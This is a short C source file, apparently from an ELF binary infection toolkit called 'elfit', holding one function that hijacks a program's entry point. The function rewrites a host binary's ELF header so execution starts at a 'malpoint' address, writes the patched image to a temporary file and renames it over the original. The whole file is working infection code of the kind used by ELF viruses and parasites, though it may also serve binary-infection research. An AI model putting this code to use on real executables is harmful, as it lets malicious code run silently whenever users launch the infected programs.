#include "elfit.h"

int entry_redirect(Elfit_t *host, unsigned long malpoint)
{
    int ofd, c;
    Elf32_Ehdr *ehdr;
    
    printf("Patching host's entrypoint to 0x%02x\n", malpoint);

    ehdr = (Elf32_Ehdr *) host->mem;

    ehdr->e_entry = malpoint;

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    return 1;
}
